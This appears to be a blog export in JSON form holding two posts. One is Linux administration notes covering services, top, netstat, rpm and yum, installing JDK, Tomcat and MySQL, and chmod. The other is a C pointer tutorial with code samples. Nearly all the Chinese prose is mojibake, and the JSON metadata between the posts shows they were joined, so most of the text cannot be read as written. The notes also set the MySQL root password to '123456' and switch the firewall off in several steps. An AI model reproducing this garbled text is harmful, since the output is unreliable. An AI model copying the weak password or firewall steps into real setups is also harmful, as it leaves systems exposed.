chkconfig æœåŠ¡å â€”list chkconfig â€”level 5 æœåŠ¡å on/off å°† sshd æœåŠ¡åœ¨è¿è¡Œçº§åˆ«ä¸º 5 çš„æƒ…å†µä¸‹ï¼Œä¸è¦è‡ªå¯åŠ¨ 1594039797350 è¯·æ˜¾ç¤ºå½“å‰ç³»ç»Ÿæ‰€æœ‰æœåŠ¡çš„å„ä¸ªè¿è¡Œçº§åˆ«çš„è¿è¡ŒçŠ¶æ€ bash&gt; chkconfig â€”list æŸ¥çœ‹ sshd æœåŠ¡çš„è¿è¡ŒçŠ¶æ€** bash&gt; service sshd status å°† sshd æœåŠ¡åœ¨è¿è¡Œçº§åˆ« 5 ä¸‹è®¾ç½®ä¸ºä¸è‡ªåŠ¨å¯åŠ¨ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆæ•ˆæœï¼Ÿ bash&gt; chkconfig â€”level 5 sshd off å½“è¿è¡Œçº§åˆ«ä¸º 5 æ—¶ï¼Œå…³é—­é˜²ç«å¢™ã€‚ bash&gt; chkconfig â€”level 5 iptables off åœ¨æ‰€æœ‰è¿è¡Œçº§åˆ«ä¸‹ï¼Œå…³é—­é˜²ç«å¢™ bash&gt; chkconfig iptables off åœ¨æ‰€æœ‰è¿è¡Œçº§åˆ«ä¸‹ï¼Œå¼€å¯é˜²ç«å¢™ bash&gt; chkconfig iptables on åŠ¨æ€ç›‘æ§è¿›ç¨‹ top ä¸ ps å‘½ä»¤å¾ˆç›¸ä¼¼ã€‚å®ƒä»¬éƒ½ç”¨æ¥æ˜¾ç¤ºæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ã€‚Top ä¸ ps æœ€å¤§çš„ä¸åŒä¹‹å¤„ï¼Œåœ¨äº top åœ¨æ‰§è¡Œä¸€æ®µæ—¶é—´å¯ä»¥æ›´æ–°æ­£åœ¨è¿è¡Œçš„çš„è¿›ç¨‹ã€‚ top [é€‰é¡¹] 1594039987313 ç›‘è§†ç‰¹å®šç”¨æˆ· topï¼šè¾“å…¥æ­¤å‘½ä»¤ï¼ŒæŒ‰å›è½¦é”®ï¼ŒæŸ¥çœ‹æ‰§è¡Œçš„è¿›ç¨‹ã€‚ uï¼šç„¶åè¾“å…¥â€œuâ€å›è½¦ï¼Œå†è¾“å…¥ç”¨æˆ·åï¼Œå³å¯ 1594040023371 ç»ˆæ­¢æŒ‡å®šçš„è¿›ç¨‹ topï¼šè¾“å…¥æ­¤å‘½ä»¤ï¼ŒæŒ‰å›è½¦é”®ï¼ŒæŸ¥çœ‹æ‰§è¡Œçš„è¿›ç¨‹ã€‚ kï¼šç„¶åè¾“å…¥â€œkâ€å›è½¦ï¼Œå†è¾“å…¥è¦ç»“æŸçš„è¿›ç¨‹ ID å· 1594040063985 æŒ‡å®šç³»ç»ŸçŠ¶æ€æ›´æ–°çš„æ—¶é—´(æ¯éš” 10 ç§’è‡ªåŠ¨æ›´æ–°ï¼Œ é»˜è®¤æ˜¯ 3 ç§’)ï¼š bash&gt; top -d 10 æŸ¥çœ‹ç³»ç»Ÿç½‘ç»œæƒ…å†µ netstat(é‡è¦)netstat [é€‰é¡¹] netstat -anp -an æŒ‰ä¸€å®šé¡ºåºæ’åˆ—è¾“å‡º -p æ˜¾ç¤ºå“ªä¸ªè¿›ç¨‹åœ¨è°ƒç”¨ æŸ¥çœ‹ç³»ç»Ÿæ‰€æœ‰çš„ç½‘ç»œæœåŠ¡ 1594040174174 æŸ¥çœ‹æœåŠ¡åä¸º sshd çš„æœåŠ¡çš„ä¿¡æ¯ã€‚ 1594040196413 RPM å’Œ YUMrpm åŒ…çš„ç®¡ç† ä¸€ç§ç”¨äºäº’è”ç½‘ä¸‹è½½åŒ…çš„æ‰“åŒ…åŠå®‰è£…å·¥å…·ï¼Œå®ƒåŒ…å«åœ¨æŸäº› Linux åˆ†å‘ç‰ˆä¸­ã€‚å®ƒç”Ÿæˆå…·æœ‰.RPM æ‰©å±•åçš„æ–‡ä»¶ã€‚RPM æ˜¯ RedHat Package Managerï¼ˆRedHat è½¯ä»¶åŒ…ç®¡ç†å·¥å…·ï¼‰çš„ç¼©å†™ï¼Œç±»ä¼¼ windows çš„ setup.exeï¼Œè¿™ä¸€æ–‡ä»¶æ ¼å¼åç§°è™½ç„¶æ‰“ä¸Šäº† RedHat çš„æ ‡å¿—ï¼Œä½†ç†å¿µæ˜¯é€šç”¨çš„ã€‚ Linux çš„åˆ†å‘ç‰ˆæœ¬éƒ½æœ‰é‡‡ç”¨ï¼ˆsuse,redhat, centos ç­‰ç­‰ï¼‰ï¼Œå¯ä»¥ç®—æ˜¯å…¬è®¤çš„è¡Œä¸šæ ‡å‡†äº†ã€‚ rpm åŒ…çš„ç®€å•æŸ¥è¯¢æŒ‡ä»¤æŸ¥è¯¢å·²å®‰è£…çš„ rpm åˆ—è¡¨ rpm â€“qa|grep xx è¯·æŸ¥è¯¢çœ‹ä¸€ä¸‹ï¼Œå½“å‰çš„ Linux æœ‰æ²¡æœ‰å®‰è£… firefox . 1594089056566 rpm åŒ…ååŸºæœ¬æ ¼å¼ï¼š ä¸€ä¸ª rpm åŒ…åï¼šfirefox-45.0.1-1.el6.centos.x86_64.rpm åç§°:firefox ç‰ˆæœ¬å·ï¼š45.0.1-1 é€‚ç”¨æ“ä½œç³»ç»Ÿ: el6.centos.x86_64 è¡¨ç¤º centos6.x çš„ 64 ä½ç³»ç»Ÿ å¦‚æœæ˜¯ i686i386 32 noarch rpm åŒ…çš„å…¶å®ƒæŸ¥è¯¢æŒ‡ä»¤ï¼š rpm -qa :æŸ¥è¯¢æ‰€å®‰è£…çš„æ‰€æœ‰ rpm è½¯ä»¶åŒ… rpm -qa | more [åˆ†é¡µæ˜¾ç¤º] rpm -qa | grep X [rpm -qa | grep firefox ] 1594089139190 rpm -q è½¯ä»¶åŒ…å :æŸ¥è¯¢è½¯ä»¶åŒ…æ˜¯å¦å®‰è£… rpm -q firefox rpm -qi è½¯ä»¶åŒ…å ï¼šæŸ¥è¯¢è½¯ä»¶åŒ…ä¿¡æ¯ 1594089158445 rpm -qi file rpm -ql è½¯ä»¶åŒ…å :æŸ¥è¯¢è½¯ä»¶åŒ…ä¸­çš„æ–‡ä»¶ rpm -ql firefox 1594089191772 rpm -qf æ–‡ä»¶å…¨è·¯å¾„å æŸ¥è¯¢æ–‡ä»¶æ‰€å±çš„è½¯ä»¶åŒ… rpm -qf /etc/passwd rpm -qf /root/install.log img å¸è½½ rpm åŒ…ï¼šrpm -e RPM åŒ…çš„åç§° åˆ é™¤ firefox è½¯ä»¶åŒ… 1594089294137 1) å¦‚æœå…¶å®ƒè½¯ä»¶åŒ…ä¾èµ–äºæ‚¨è¦å¸è½½çš„è½¯ä»¶åŒ…ï¼Œå¸è½½æ—¶åˆ™ä¼šäº§ç”Ÿé”™è¯¯ä¿¡æ¯ã€‚å¦‚ï¼š $ rpm -e foo removing these packages would break dependencies:foo is needed by bar-1.0-1 2) å¦‚æœæˆ‘ä»¬å°±æ˜¯è¦åˆ é™¤ foo è¿™ä¸ª rpm åŒ…ï¼Œå¯ä»¥å¢åŠ å‚æ•° â€”nodeps ,å°±å¯ä»¥å¼ºåˆ¶åˆ é™¤ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸æ¨èè¿™æ ·åšï¼Œå› ä¸ºä¾èµ–äºè¯¥è½¯ä»¶åŒ…çš„ç¨‹åºå¯èƒ½æ— æ³•è¿è¡Œ å¦‚ï¼š$ rpm -e â€”nodeps foo å¸¦ä¸Š â€”nodeps å°±æ˜¯å¼ºåˆ¶åˆ é™¤ã€‚ å®‰è£… rpm åŒ…ï¼šrpm -ivh RPM åŒ…å…¨è·¯å¾„åç§° i=install å®‰ è£… v=verbose æ ç¤º h=hash è¿›åº¦æ¡ 1) æ¼”ç¤ºå®‰è£… firefox æµè§ˆå™¨ æ­¥éª¤å…ˆæ‰¾åˆ° firefox çš„å®‰è£… rpm åŒ…,ä½ éœ€è¦æŒ‚è½½ä¸Šæˆ‘ä»¬å®‰è£… centos çš„ iso æ–‡ä»¶ï¼Œç„¶ååˆ°/media/ä¸‹å»æ‰¾ rpm æ‰¾ ã€‚ cp firefox-45.0.1-1.el6.centos.x86_64.rpm /opt/ 1594089388980 yum Yum æ˜¯ä¸€ä¸ª Shell å‰ç«¯è½¯ä»¶åŒ…ç®¡ç†å™¨ã€‚åŸºäº RPM åŒ…ç®¡ç†ï¼Œèƒ½å¤Ÿä»æŒ‡å®šçš„æœåŠ¡å™¨è‡ªåŠ¨ä¸‹è½½ RPM åŒ…å¹¶ä¸”å®‰è£…ï¼Œå¯ä»¥è‡ªåŠ¨å¤„ç†ä¾èµ–æ€§å…³ç³»ï¼Œå¹¶ä¸”ä¸€æ¬¡å®‰è£…æ‰€æœ‰ä¾èµ–çš„è½¯ä»¶åŒ…ã€‚ä½¿ç”¨ yum çš„å‰ææ˜¯å¯ä»¥è”ç½‘ã€‚ 1594089423920 æŸ¥è¯¢ yum æœåŠ¡å™¨æ˜¯å¦æœ‰éœ€è¦å®‰è£…çš„è½¯ä»¶ yum list|grep xx è½¯ä»¶åˆ—è¡¨ å®‰è£…æŒ‡å®šçš„ yum åŒ… yum install xxx ä¸‹è½½å®‰è£… ä½¿ç”¨ yum çš„æ–¹å¼æ¥å®‰è£… firefox å…ˆæŸ¥çœ‹ä¸€ä¸‹ firefox rpm åœ¨ yum æœåŠ¡å™¨æœ‰æ²¡æœ‰ 1594089517271 1) å®‰è£… yum install firefox æ­å»º JavaEE ç¯å¢ƒ1594089578388 1594089603193 å®‰è£… JDK0) å…ˆå°†è½¯ä»¶é€šè¿‡ xftp5 ä¸Šä¼ åˆ° /opt ä¸‹ 1) è§£å‹ç¼©åˆ° /opt 2) é…ç½®ç¯å¢ƒå˜é‡çš„é…ç½®æ–‡ä»¶ vim /etc/profile 1594089685175 JAVA_HOME=/opt/jdk1.7.0_79 PATH=/opt/jdk1.7.0_79/bin:$PATH export JAVA_HOME PATH 3)éœ€è¦æ³¨é”€ç”¨æˆ·ï¼Œç¯å¢ƒå˜é‡æ‰èƒ½ç”Ÿæ•ˆ å¦‚æœæ˜¯åœ¨ 3 è¿è¡Œçº§åˆ«ï¼Œ logout å¦‚æœæ˜¯åœ¨ 5 è¿è¡Œçº§åˆ«ï¼Œ 4) åœ¨ä»»ä½•ç›®å½•ä¸‹å°±å¯ä»¥ä½¿ç”¨ java å’Œ javac 1594089893452 æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ â€‹ ç¼–å†™ä¸€ä¸ªç®€å•çš„ è¾“å‡º Hello.java è¾“å‡ºâ€hello,world!â€ 1594089954309 å®‰è£… tomcat1) è§£å‹ç¼©åˆ°/opt 1594089990057 2)å¯åŠ¨ tomcat ./startup.sh å…ˆè¿›å…¥åˆ° tomcat çš„ bin ç›®å½• 1594090017998 1594090025822 ä½¿ç”¨ Linux æœ¬åœ°çš„æµè§ˆæ˜¯å¯ä»¥è®¿é—®åˆ° tomcat å¼€æ”¾ç«¯å£ 8080 ,è¿™æ ·å¤–ç½‘æ‰èƒ½è®¿é—®åˆ° tomcat vim /etc/sysconfig/iptables é‡å¯é˜²ç«å¢™ 1594090082996 æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸï¼š åœ¨ windowsã€Linux ä¸‹ è®¿é—® http://linuxip:8080 1594090112721 Eclipse çš„å®‰è£…1) è§£å‹ç¼©åˆ°/opt 1594090161102 2)å¯åŠ¨ eclipseï¼Œé…ç½® jre å’Œ server å¯åŠ¨æ–¹æ³• 1: åˆ›å»ºä¸€ä¸ªå¿«æ·æ–¹å¼ å¯åŠ¨æ–¹å¼ 2: è¿›å…¥åˆ° eclipse è§£å‹åçš„æ–‡ä»¶å¤¹ï¼Œç„¶åæ‰§è¡Œ ./eclipse å³å¯ 3)ç¼–å†™ jsp é¡µé¢,å¹¶æµ‹è¯•æˆåŠŸ! 1594090202684 mysql çš„å®‰è£…å’Œé…ç½®rpm -ivh MYSQL-server-***.rpm rpm -ivh MYSQL-client-***.rpm æŸ¥çœ‹æ˜¯å¦å¯åŠ¨ ps -ef|grep mysql æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ mysqladmin --version å¯åŠ¨æœåŠ¡ service mysql start è¿æ¥ mysql æ”¹å¯†ç  /usr/bin/mysqladmin -u root password 123456 è¿æ¥ mysql -uroot -p è®¾ç½®å¼€æœºè‡ªå¯åŠ¨ chkconfig mysql on 1595838101340 æ‹·è´é…ç½®æ–‡ä»¶ cp /usr/share/mysql/my-huge.cnf /etc/my.cnf è§£å†³ç¼–ç (å·²åˆ›å»ºçš„æ•°æ®åº“ä¸å½±å“)æ˜¾ç¤ºå­—ç¬¦é›† show variables like &#39;%char%&#39; ä¿®æ”¹å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„å­—ç¬¦é›† vim /etc/my.cnf //åœ¨[client]çš„socketçš„ä¸‹æ–¹æ’å…¥ //åœ¨å…‰æ ‡çš„ä¸‹ä¸€è¡Œæ’å…¥ ä½¿ç”¨o default-character-set=utf-8 //åœ¨[mysqld]çš„portä¸‹æ’å…¥ character_set_server=utf8 character_set_client=utf8 collation-server=utf8_general_ci //åœ¨[mysql]çš„no-auto-rehashä¸‹æ’å…¥ default-character-set=utf8 Linuxä¸­å¸¸ç”¨åˆ°çš„å‘½ä»¤æ˜¾ç¤ºæ–‡ä»¶ç›®å½•å‘½ä»¤ls å¦‚lsæ”¹å˜å½“å‰ç›®å½•å‘½ä»¤cd å¦‚cd /homeå»ºç«‹å­ç›®å½•mkdir å¦‚mkdir xiongåˆ é™¤å­ç›®å½•å‘½ä»¤rmdir å¦‚rmdir /mnt/cdromåˆ é™¤æ–‡ä»¶å‘½ä»¤rm å¦‚rm /ucdos.batæ–‡ä»¶å¤åˆ¶å‘½ä»¤cp å¦‚cp /ucdos /foxè·å–å¸®åŠ©ä¿¡æ¯å‘½ä»¤man å¦‚man lsæ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹less å¦‚less mwm.lx Linuxæ–‡ä»¶å±æ€§æœ‰å“ªäº›ï¼Ÿï¼ˆå…±åä½ï¼‰-rw-râ€”râ€”é‚£ä¸ªæ˜¯æƒé™ç¬¦å·ï¼Œæ€»å…±æ˜¯- â€”- â€”- â€”-è¿™å‡ ä¸ªä½ã€‚ ç¬¬ä¸€ä¸ªçŸ­æ¨ªå¤„æ˜¯æ–‡ä»¶ç±»å‹è¯†åˆ«ç¬¦ï¼š-è¡¨ç¤ºæ™®é€šæ–‡ä»¶ï¼›cè¡¨ç¤ºå­—ç¬¦è®¾å¤‡ï¼ˆcharacterï¼‰ï¼›bè¡¨ç¤ºå—è®¾å¤‡ï¼ˆblockï¼‰ï¼›dè¡¨ç¤ºç›®å½•ï¼ˆdirectoryï¼‰ï¼›lè¡¨ç¤ºé“¾æ¥æ–‡ä»¶ï¼ˆlinkï¼‰ï¼› ç¬¬ä¸€ä¸ªä¸‰ä¸ªè¿ç»­çš„çŸ­æ¨ªæ˜¯ç”¨æˆ·æƒé™ä½ï¼ˆUserï¼‰ ç¬¬äºŒä¸ªä¸‰ä¸ªè¿ç»­çŸ­æ¨ªæ˜¯ç»„æƒé™ä½ï¼ˆGroupï¼‰ ç¬¬ä¸‰ä¸ªä¸‰ä¸ªè¿ç»­çŸ­æ¨ªæ˜¯å…¶ä»–æƒé™ä½ï¼ˆOtherï¼‰ã€‚æ¯ä¸ªæƒé™ä½æœ‰ä¸‰ä¸ªæƒé™ï¼Œrï¼ˆè¯»æƒé™ï¼‰ï¼Œwï¼ˆå†™æƒé™ï¼‰ï¼Œxï¼ˆæ‰§è¡Œæƒé™ï¼‰ã€‚ å¦‚æœæ¯ä¸ªæƒé™ä½éƒ½æœ‰æƒé™å­˜åœ¨ï¼Œé‚£ä¹ˆæ»¡æƒé™çš„æƒ…å†µå°±æ˜¯ï¼š-rwxrwxrwxï¼›æƒé™ä¸ºç©ºçš„æƒ…å†µå°±æ˜¯- â€”- â€”- â€”-ã€‚æƒé™çš„è®¾å®šå¯ä»¥ç”¨chmodå‘½ä»¤ï¼Œå…¶æ ¼å¼ä½ï¼šchmod ugoa+/-/=rwx filename/directoryã€‚ä¾‹å¦‚ï¼šä¸€ä¸ªæ–‡ä»¶aaaå…·æœ‰å®Œå…¨ç©ºçš„æƒé™- â€”- â€”- â€”-ã€‚chmod u+rw aaaï¼ˆç»™ç”¨æˆ·æƒé™ä½è®¾ç½®ï¼ˆå¢åŠ ï¼‰è¯»å†™æƒé™ï¼Œå…¶æƒé™è¡¨ç¤ºä¸ºï¼š- rw- â€”- â€”-ï¼‰chmod g+r aaaï¼ˆç»™ç»„è®¾ç½®æƒé™ä¸ºå¯è¯»ï¼Œå…¶æƒé™è¡¨ç¤ºä¸ºï¼š- â€”- râ€” â€”-ï¼‰chmod ugo+rw aaaï¼ˆç»™ç”¨æˆ·ã€ç»„ã€å…¶å®ƒç”¨æˆ·æˆ–ç»„è®¾ç½®æƒé™ä¸ºè¯»å†™ï¼Œæƒé™è¡¨ç¤ºä¸ºï¼š- rw- rw- rw-ï¼‰å¦‚æœaaaå…·æœ‰æ»¡æƒé™- rwx rwx rwxã€‚chmod u-x aaaï¼ˆå»æ‰ç”¨æˆ·å¯æ‰§è¡Œæƒé™ï¼Œæƒé™è¡¨ç¤ºä¸ºï¼š- rw- rwx rwxï¼‰å¦‚æœè¦ç»™aaaèµ‹äºˆåˆ¶å®šæƒé™- rwx r-x r-xï¼Œå‘½ä»¤ä¸ºï¼šchmod u=rwxï¼Œgo=rx aaa","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.kayleh.top/tags/linux/"}]},{"title":"C pointer","slug":"C-prime-plus","date":"2020-06-28T01:33:01.000Z","updated":"2021-04-11T17:11:28.115Z","comments":true,"path":"C-prime-plus/","link":"","permalink":"https://blog.kayleh.top/C-prime-plus/","excerpt":"æŒ‡é’ˆ","text":"æŒ‡é’ˆ æ¯ä¸€ä¸ªå˜é‡éƒ½æœ‰ä¸€ä¸ªå†…å­˜ä½ç½®ï¼Œæ¯ä¸€ä¸ªå†…å­˜ä½ç½®éƒ½å®šä¹‰äº†å¯ä½¿ç”¨è¿å­—å·ï¼ˆ&amp;ï¼‰è¿ç®—ç¬¦è®¿é—®çš„åœ°å€ï¼Œå®ƒè¡¨ç¤ºäº†åœ¨å†…å­˜ä¸­çš„ä¸€ä¸ªåœ°å€ã€‚å–åœ°å€&amp; å–å€¼* #include &lt;stdio.h&gt; int main() { int a; char b[10]; printf(&quot;aå˜é‡çš„å†…å­˜åœ°å€ï¼š%p\\n&quot;, &amp;a); printf(&quot;bå˜é‡çš„å†…å­˜åœ°å€ï¼š%p\\n&quot;, &amp;b); return 0; } è®¿é—®æ•°ç»„bçš„åœ°å€å…¶å®å°±æ˜¯æ•°ç»„ç¬¬ä¸€ä¸ªå˜é‡çš„æ•°ç»„ æŒ‡é’ˆæ˜¯ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸ºå¦ä¸€ä¸ªå˜é‡çš„åœ°å€ï¼Œå³ï¼Œå†…å­˜ä½ç½®çš„ç›´æ¥åœ°å€ã€‚å°±åƒå…¶ä»–å˜é‡æˆ–å¸¸é‡ä¸€æ ·ï¼Œæ‚¨å¿…é¡»åœ¨ä½¿ç”¨æŒ‡é’ˆå­˜å‚¨å…¶ä»–å˜é‡åœ°å€ä¹‹å‰ï¼Œå¯¹å…¶è¿›è¡Œå£°æ˜ã€‚æŒ‡é’ˆå˜é‡å£°æ˜çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼š type *var-name; åœ¨è¿™é‡Œï¼Œtype æ˜¯æŒ‡é’ˆçš„åŸºç±»å‹ï¼Œå®ƒå¿…é¡»æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ C æ•°æ®ç±»å‹ï¼Œvar-name æ˜¯æŒ‡é’ˆå˜é‡çš„åç§°ã€‚ç”¨æ¥å£°æ˜æŒ‡é’ˆçš„æ˜Ÿå· * ä¸ä¹˜æ³•ä¸­ä½¿ç”¨çš„æ˜Ÿå·æ˜¯ç›¸åŒçš„ã€‚ä½†æ˜¯ï¼Œåœ¨è¿™ä¸ªè¯­å¥ä¸­ï¼Œæ˜Ÿå·æ˜¯ç”¨æ¥æŒ‡å®šä¸€ä¸ªå˜é‡æ˜¯æŒ‡é’ˆã€‚ä»¥ä¸‹æ˜¯æœ‰æ•ˆçš„æŒ‡é’ˆå£°æ˜ï¼š int *ip; /* ä¸€ä¸ªæ•´å‹çš„æŒ‡é’ˆ */ double *dp; /* ä¸€ä¸ª double å‹çš„æŒ‡é’ˆ */ float *fp; /* ä¸€ä¸ªæµ®ç‚¹å‹çš„æŒ‡é’ˆ */ char *ch; /* ä¸€ä¸ªå­—ç¬¦å‹çš„æŒ‡é’ˆ */ æ‰€æœ‰å®é™…æ•°æ®ç±»å‹ï¼Œä¸ç®¡æ˜¯æ•´å‹ã€æµ®ç‚¹å‹ã€å­—ç¬¦å‹ï¼Œè¿˜æ˜¯å…¶ä»–çš„æ•°æ®ç±»å‹ï¼Œå¯¹åº”æŒ‡é’ˆçš„å€¼çš„ç±»å‹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ä¸€ä¸ªä»£è¡¨å†…å­˜åœ°å€çš„é•¿çš„åå…­è¿›åˆ¶æ•°ã€‚ æŒ‡é’ˆçš„ä½¿ç”¨ ä½¿ç”¨æŒ‡é’ˆæ—¶ä¼šé¢‘ç¹è¿›è¡Œä»¥ä¸‹å‡ ä¸ªæ“ä½œï¼šå®šä¹‰ä¸€ä¸ªæŒ‡é’ˆå˜é‡ã€æŠŠå˜é‡åœ°å€èµ‹å€¼ç»™æŒ‡é’ˆã€è®¿é—®æŒ‡é’ˆå˜é‡ä¸­å¯ç”¨åœ°å€çš„å€¼ã€‚è¿™äº›æ˜¯é€šè¿‡ä½¿ç”¨ä¸€å…ƒè¿ç®—ç¬¦ * æ¥è¿”å›ä½äºæ“ä½œæ•°æ‰€æŒ‡å®šåœ°å€çš„å˜é‡çš„å€¼ã€‚ä¸‹é¢çš„å®ä¾‹æ¶‰åŠåˆ°äº†è¿™äº›æ“ä½œï¼š #include &lt;stdio.h&gt; int main () { int var = 20; /* å®é™…å˜é‡çš„å£°æ˜ */ int *ip; /* æŒ‡é’ˆå˜é‡çš„å£°æ˜ */ ip = &amp;var; /* åœ¨æŒ‡é’ˆå˜é‡ä¸­å­˜å‚¨ var çš„åœ°å€ */ printf(&quot;Address of var variable: %p\\n&quot;, &amp;var ); /* åœ¨æŒ‡é’ˆå˜é‡ä¸­å­˜å‚¨çš„åœ°å€ */ printf(&quot;Address stored in ip variable: %p\\n&quot;, ip ); /* ä½¿ç”¨æŒ‡é’ˆè®¿é—®å€¼ */ printf(&quot;Value of *ip variable: %d\\n&quot;, *ip ); //20 return 0; } C ä¸­çš„ NULL æŒ‡é’ˆåœ¨å˜é‡å£°æ˜çš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰ç¡®åˆ‡çš„åœ°å€å¯ä»¥èµ‹å€¼ï¼Œä¸ºæŒ‡é’ˆå˜é‡èµ‹ä¸€ä¸ª NULL å€¼æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ã€‚èµ‹ä¸º NULL å€¼çš„æŒ‡é’ˆè¢«ç§°ä¸ºç©ºæŒ‡é’ˆã€‚ NULL æŒ‡é’ˆæ˜¯ä¸€ä¸ªå®šä¹‰åœ¨æ ‡å‡†åº“ä¸­çš„å€¼ä¸ºé›¶çš„å¸¸é‡ã€‚è¯·çœ‹ä¸‹é¢çš„ç¨‹åºï¼š #include &lt;stdio.h&gt; int main () { int *ptr = NULL; printf(&quot;ptr çš„åœ°å€æ˜¯ %p\\n&quot;, ptr ); return 0; } åœ¨å¤§å¤šæ•°çš„æ“ä½œç³»ç»Ÿä¸Šï¼Œç¨‹åºä¸å…è®¸è®¿é—®åœ°å€ä¸º 0 çš„å†…å­˜ï¼Œå› ä¸ºè¯¥å†…å­˜æ˜¯æ“ä½œç³»ç»Ÿä¿ç•™çš„ã€‚ç„¶è€Œï¼Œå†…å­˜åœ°å€ 0 æœ‰ç‰¹åˆ«é‡è¦çš„æ„ä¹‰ï¼Œå®ƒè¡¨æ˜è¯¥æŒ‡é’ˆä¸æŒ‡å‘ä¸€ä¸ªå¯è®¿é—®çš„å†…å­˜ä½ç½®ã€‚ä½†æŒ‰ç…§æƒ¯ä¾‹ï¼Œå¦‚æœæŒ‡é’ˆåŒ…å«ç©ºå€¼ï¼ˆé›¶å€¼ï¼‰ï¼Œåˆ™å‡å®šå®ƒä¸æŒ‡å‘ä»»ä½•ä¸œè¥¿ã€‚ å¦‚éœ€æ£€æŸ¥ä¸€ä¸ªç©ºæŒ‡é’ˆï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ if è¯­å¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š if(ptr) /* å¦‚æœ p éç©ºï¼Œåˆ™å®Œæˆ */ if(!ptr) /* å¦‚æœ p ä¸ºç©ºï¼Œåˆ™å®Œæˆ */ æŒ‡é’ˆçš„ç®—æ•°è¿ç®—C æŒ‡é’ˆæ˜¯ä¸€ä¸ªç”¨æ•°å€¼è¡¨ç¤ºçš„åœ°å€ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥å¯¹æŒ‡é’ˆæ‰§è¡Œç®—æœ¯è¿ç®—ã€‚å¯ä»¥å¯¹æŒ‡é’ˆè¿›è¡Œå››ç§ç®—æœ¯è¿ç®—ï¼š++ã€â€”ã€+ã€-ã€‚ å‡è®¾ ptr æ˜¯ä¸€ä¸ªæŒ‡å‘åœ°å€ 1000 çš„æ•´å‹æŒ‡é’ˆï¼Œæ˜¯ä¸€ä¸ª 32 ä½çš„æ•´æ•°ï¼Œè®©æˆ‘ä»¬å¯¹è¯¥æŒ‡é’ˆæ‰§è¡Œä¸‹åˆ—çš„ç®—æœ¯è¿ç®—ï¼š ptr++ åœ¨æ‰§è¡Œå®Œä¸Šè¿°çš„è¿ç®—ä¹‹åï¼Œptr å°†æŒ‡å‘ä½ç½® 1004ï¼Œå› ä¸º ptr æ¯å¢åŠ ä¸€æ¬¡ï¼Œå®ƒéƒ½å°†æŒ‡å‘ä¸‹ä¸€ä¸ªæ•´æ•°ä½ç½®ï¼Œå³å½“å‰ä½ç½®å¾€åç§» 4 å­—èŠ‚ã€‚è¿™ä¸ªè¿ç®—ä¼šåœ¨ä¸å½±å“å†…å­˜ä½ç½®ä¸­å®é™…å€¼çš„æƒ…å†µä¸‹ï¼Œç§»åŠ¨æŒ‡é’ˆåˆ°ä¸‹ä¸€ä¸ªå†…å­˜ä½ç½®ã€‚å¦‚æœ ptr æŒ‡å‘ä¸€ä¸ªåœ°å€ä¸º 1000 çš„å­—ç¬¦ï¼Œä¸Šé¢çš„è¿ç®—ä¼šå¯¼è‡´æŒ‡é’ˆæŒ‡å‘ä½ç½® 1001ï¼Œå› ä¸ºä¸‹ä¸€ä¸ªå­—ç¬¦ä½ç½®æ˜¯åœ¨ 1001ã€‚ æˆ‘ä»¬æ¦‚æ‹¬ä¸€ä¸‹ï¼š æŒ‡é’ˆçš„æ¯ä¸€æ¬¡é€’å¢ï¼Œå®ƒå…¶å®ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ çš„å­˜å‚¨å•å…ƒã€‚ æŒ‡é’ˆçš„æ¯ä¸€æ¬¡é€’å‡ï¼Œå®ƒéƒ½ä¼šæŒ‡å‘å‰ä¸€ä¸ªå…ƒç´ çš„å­˜å‚¨å•å…ƒã€‚ æŒ‡é’ˆåœ¨é€’å¢å’Œé€’å‡æ—¶è·³è·ƒçš„å­—èŠ‚æ•°å–å†³äºæŒ‡é’ˆæ‰€æŒ‡å‘å˜é‡æ•°æ®ç±»å‹é•¿åº¦ï¼Œæ¯”å¦‚ int å°±æ˜¯ 4 ä¸ªå­—èŠ‚ã€‚ é€’å¢ä¸€ä¸ªæŒ‡é’ˆæˆ‘ä»¬å–œæ¬¢åœ¨ç¨‹åºä¸­ä½¿ç”¨æŒ‡é’ˆä»£æ›¿æ•°ç»„ï¼Œå› ä¸ºå˜é‡æŒ‡é’ˆå¯ä»¥é€’å¢ï¼Œè€Œæ•°ç»„ä¸èƒ½é€’å¢ï¼Œæ•°ç»„å¯ä»¥çœ‹æˆä¸€ä¸ªæŒ‡é’ˆå¸¸é‡ã€‚ä¸‹é¢çš„ç¨‹åºé€’å¢å˜é‡æŒ‡é’ˆï¼Œä»¥ä¾¿é¡ºåºè®¿é—®æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ï¼š #include &lt;stdio.h&gt; const int MAX = 3; int main () { int var[] = {10, 100, 200}; int i, *ptr; /* æŒ‡é’ˆä¸­çš„æ•°ç»„åœ°å€ */ ptr = var; for ( i = 0; i &lt; MAX; i++) { printf(&quot;å­˜å‚¨åœ°å€ï¼švar[%d] = %x\\n&quot;, i, ptr ); printf(&quot;å­˜å‚¨å€¼ï¼švar[%d] = %d\\n&quot;, i, *ptr ); /* ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªä½ç½® */ ptr++; } return 0; } ---- å­˜å‚¨åœ°å€ï¼švar[0] = bf882b30 å­˜å‚¨å€¼ï¼švar[0] = 10 å­˜å‚¨åœ°å€ï¼šof var[1] = bf882b34 å­˜å‚¨å€¼ï¼š var[1] = 100 å­˜å‚¨åœ°å€ï¼šof var[2] = bf882b38 å­˜å‚¨å€¼ï¼švar[2] = 200 